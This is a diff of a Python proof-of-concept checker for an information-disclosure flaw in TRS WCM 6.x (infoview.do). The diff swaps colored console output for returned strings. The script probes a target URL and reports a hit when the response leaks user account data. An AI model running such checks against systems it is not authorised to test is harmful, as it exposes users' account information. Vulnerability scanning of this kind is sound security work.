@@ -8,8 +8,8 @@ description: 文件infoview.do中导致信息泄露。
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class trs_wcm_infoview_disclosure_BaseVerify:
     def __init__(self, url):
@@ -24,12 +24,12 @@ class trs_wcm_infoview_disclosure_BaseVerify:
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"<USERNAME>" in req.text and r"<Users>" in req.text:
-                cprint("[+]存在TRS wcm 6.x版本infoview信息泄露漏洞...(中危)\tpayload: "+vulnurl, "yellow")
+                return "[+]存在TRS wcm 6.x版本infoview信息泄露漏洞...(中危)\tpayload: "+vulnurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = trs_wcm_infoview_disclosure_BaseVerify(sys.argv[1])
     testVuln.run()
